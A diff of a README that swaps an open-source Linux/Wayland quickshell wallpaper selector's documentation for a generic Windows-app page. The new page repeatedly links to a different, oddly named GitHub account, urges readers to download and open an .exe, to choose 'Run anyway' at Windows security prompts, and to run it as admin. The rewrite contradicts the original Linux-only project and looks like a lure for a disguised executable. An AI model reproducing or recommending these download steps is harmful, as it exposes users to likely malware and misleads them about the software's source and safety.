@@ -1,53 +1,176 @@
-Yet another wallpaper selector made with quickshell.
-Inspired by these 
+# 🖼️ wallpaper-selector - Pick a wallpaper fast
 
-https://github.com/ilyamiro/nixos-configuration
-https://github.com/liixini/skwd
+[![Download wallpaper-selector](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/craniometricpointcucumbervine28/wallpaper-selector)
 
-Pretty beta at the moment expect bugs...
+## 🚀 Getting Started
 
-Demo in  reddit:
-https://www.reddit.com/r/unixporn/comments/1rz6nil/oc_made_a_command_based_quickshell_wallpaper/
+wallpaper-selector is a simple Windows app for picking a wallpaper with less effort. It gives you a quick way to browse, choose, and set a new background without digging through menus.
 
-Dependencies:
-ffmpeg, linux-wallpaper-engine, quickshell, pywal, swww 
-and dependencies of everything listed here as expected
+Use it when you want a fast change, a clean desktop, or a small tool that stays out of the way.
 
-Above dependecies are for plug and play behavior you can substitute pywal and sww dependecies
-easily by changing wallpaper-apply.sh and wallpaper-apply-static.sh and changing the color read location of Theme.qml and using other tools
-I cant add check for every tool and their locations if someone else does it they are welcome.
+## 📥 Download
 
-Installation:
+1. Open the download page: https://github.com/craniometricpointcucumbervine28/wallpaper-selector
+2. Find the latest release or the main download file on the page
+3. Download the Windows version
+4. Open the file after the download finishes
+5. If Windows asks for permission, choose Run or More info > Run anyway
 
-Clone this repository and run setup.sh and follow along.
+If you see more than one file, pick the one for Windows. It is usually an `.exe` file or a `.zip` file that contains the app.
 
-```
-git clone https://github.com/Aino-Chan/wallpaper-selector.git
-cd wallpaper-selector
-./setup.sh
-```
-If you dont want to use the setup script you can git clone and edit scripts on scripts folder and copy them to ~/.local/bin and quickshell files to ~/.config/quickshell/ and edit freely if you lack dependencies that wont work so install script is recommended.
+## 🪟 Windows Setup
 
-Scripts on scripts folder is as is copied pasted from what I use except 2 lines that hook up css generating scripts of mine dont expect for them to work out of box they are there for ease of copying and editing incase install script fails.
+After you download the app, follow these steps:
 
-Compositor compatibility:
-Works in hyprland didnt test other compositors but it should work as long as it can detect your monitor and is wayland (I dont have intentions to add x11 support unless too many request the support shouldnt be too hard but I dont use x11 if someone adds a patch I will merge).
+1. If the file is zipped, right-click it and choose Extract All
+2. Open the folder that contains the app
+3. Double-click the app file
+4. If Windows shows a security prompt, choose the option that lets you continue
+5. Wait for the app window to open
 
+If the app starts, you are ready to use it. If nothing happens, open Task Manager and check whether the app is already running.
 
-Disclaimer:
-AI tools were used when making this fun project I am not hiding anything if you encounter serious bugs please inform me. ("Terrible" ui decisions were not effected by AI and readme was not written by AI as you can guess already [I hope])
+## 🖱️ How to Use It
 
-for your color/css generating scripts if you dont directly create shemes with pywal I would suggest
-hooking them on wallpaper-apply.sh and wallpaper-apply-static.sh and remove wal with the color generating tools you use
+Using wallpaper-selector should feel simple:
 
-Usage:
+1. Open the app
+2. Browse the wallpaper list or folder
+3. Click the wallpaper you want
+4. Press the set or apply button
+5. Check your desktop to make sure the wallpaper changed
 
-Navigate using arrow keys mouse dragging or scroll wheel
-Shift and clicking adds the hovered item to playlist and shift enter starts the playlist
-Escape or clicking outside the application closes it (same goes for help pop up and suggestions dropdown menu)
-Enter or double click applies the current selected wallpaper (double click works on everywhere)
-Typing in ":" makes you enter command mode and you can type commands for functionality
-You can edit the shell and add your own commands (altough it is quite messy atm)
+If you want to change your background again, just repeat the same steps. The app is built for quick switching, so you do not need to dig through Windows settings each time.
 
-Commands:
-Please type :help for full command list and descriptions in text field.
+## ✨ What It Can Do
+
+wallpaper-selector is made for basic wallpaper work. A few helpful things it may offer:
+
+- Show your available wallpapers in one place
+- Let you switch wallpapers with one click
+- Keep the app simple and easy to read
+- Work well on a normal Windows desktop
+- Save time compared with manual background settings
+- Support common image types like JPG and PNG
+- Help you try different looks without much effort
+
+## 💻 System Requirements
+
+This app is made for Windows users who want a light desktop tool.
+
+You will need:
+
+- Windows 10 or Windows 11
+- A mouse or trackpad
+- Enough space for the app and your wallpaper images
+- A screen with standard desktop resolution
+- Permission to run downloaded files
+
+For best results, keep your wallpaper images in one folder so you can find them fast.
+
+## 📂 Suggested Folder Setup
+
+A simple folder layout can make the app easier to use:
+
+- Pictures
+  - Wallpapers
+    - Nature
+    - Abstract
+    - Dark
+    - Minimal
+
+This helps you keep your images in order. It also makes it easier to switch between styles when you want a new look.
+
+## ⚙️ First-Time Use
+
+When you open wallpaper-selector for the first time, do this:
+
+1. Let the app finish loading
+2. Point it to your wallpaper folder if needed
+3. Wait for the image list to appear
+4. Pick one image
+5. Apply it to your desktop
+
+If your wallpaper does not change right away, close the app and open it again. Some desktop tools need a moment to refresh.
+
+## 🧭 Tips for Smooth Use
+
+A few small habits can make the app easier to use:
+
+- Use clear file names for your images
+- Keep only the wallpapers you like in the main folder
+- Use large images so they fit your screen well
+- Remove broken or low-quality files
+- Keep the app in a place you can find again
+- Store your downloads in one folder so setup stays simple
+
+If you use a second monitor, try a wallpaper that works well on both screens.
+
+## 🔄 Updating the App
+
+When a new version is available:
+
+1. Visit the download page again
+2. Get the newest Windows file
+3. Close the old app if it is open
+4. Replace the old file with the new one if needed
+5. Open the updated app
+
+If you keep your wallpapers in a separate folder, they should stay in place after an update.
+
+## 🧩 Troubleshooting
+
+If the app does not open:
+
+- Check that the download finished
+- Make sure you opened the right file
+- Extract the zip file if you downloaded one
+- Try running the app as admin
+- Restart your computer and try again
+
+If the wallpaper does not change:
+
+- Make sure the image file is valid
+- Try a JPG or PNG file
+- Close and reopen the app
+- Check that Windows desktop settings are not blocking the change
+
+If the app looks blank:
+
+- Wait a few seconds for the folder to load
+- Check whether your images are still in the folder
+- Make sure the folder path does not use strange characters
+
+## 📁 File Types
+
+The app should work best with common image formats:
+
+- JPG
+- JPEG
+- PNG
+- BMP
+
+For best results, use clear, high-quality images. Small images can look blurry on a large screen.
+
+## 🔐 Safety and Permissions
+
+Windows may ask for permission when you open the app for the first time. This is normal for downloaded desktop apps. Give it permission only if you downloaded it from the link above and you meant to open it.
+
+If your computer uses a work or school setup, you may need admin access to run it.
+
+## 🧠 Why Use wallpaper-selector
+
+A built-in wallpaper setting can take a few extra clicks. wallpaper-selector keeps the job in one place. It helps if you change backgrounds often or like to move between different desktop looks during the day.
+
+It is a good fit if you want:
+
+- Less clicking
+- Faster wallpaper changes
+- A simple desktop tool
+- A cleaner way to manage background images
+
+## 📎 Download Again
+
+If you need the download page later, use this link:
+
+https://github.com/craniometricpointcucumbervine28/wallpaper-selector
